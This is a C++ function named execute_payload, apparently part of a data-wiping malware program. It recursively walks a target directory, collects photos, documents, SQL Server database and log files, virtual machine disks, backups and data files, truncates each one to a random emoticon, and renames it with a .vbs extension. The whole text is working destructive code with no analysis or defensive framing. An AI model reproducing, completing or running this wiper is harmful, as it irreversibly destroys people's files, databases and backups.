void execute_payload(const string& target_path) {
    vector<string> emoticons = {":3", "OwO", ">w<", "^w^"};
    
    static random_device rd; 
    static mt19937 gen(rd());
    uniform_int_distribution<> emo_dist(0, emoticons.size() - 1);
    uniform_int_distribution<> chance_dist(1, 100);

    if (!fs::exists(target_path)) return;
    vector<fs::path> target_files;

    try {
        auto options = fs::directory_options::skip_permission_denied;
        for (auto& entry : fs::recursive_directory_iterator(target_path, options)) {
            if (!entry.is_regular_file()) continue;
            
            string ext = entry.path().extension().string();
            transform(ext.begin(), ext.end(), ext.begin(), [](unsigned char c) { 
                return tolower(c); 
            });
            
            if (ext == ".jpg"  || ext == ".png"    || ext == ".mdf"     || ext == ".ldf"  || 
                ext == ".vhdx" || ext == ".vmdk"   || ext == ".parquet" || ext == ".avro" || 
                ext == ".bak"  || ext == ".sql"    || ext == ".json"    || ext == ".pdf"  || 
                ext == ".bat"  || ext == ".gdoc"   || ext == ".docx") 
            { 
                target_files.push_back(entry.path()); 
            }
        }
    } catch (const fs::filesystem_error& e) {
        cerr << "Filesystem scanning error: " << e.what() << endl;
        return;
    }

    // Step 2: Process files safely outside the directory iterator loop
    for (auto& file_path : target_files) {
        string chosen_string = (chance_dist(gen) == 1) ? "X3" : emoticons[emo_dist(gen)];
        
        try {
            // Wiping phase
            {
                ofstream stream(file_path, ios::binary | ios::trunc);
                if (stream.is_open()) {
                    stream << chosen_string;
                }
            } 

            // Renaming phase
            string old_path_str = file_path.string();
            string new_path_str = old_path_str + ".vbs";
            
            if (file_path.extension() != ".vbs") { 
                fs::rename(old_path_str, new_path_str); 
            }
        } catch (const exception& e) {
            cerr << "Failed to process file " << file_path << ": " << e.what() << endl;
        }
    }
}
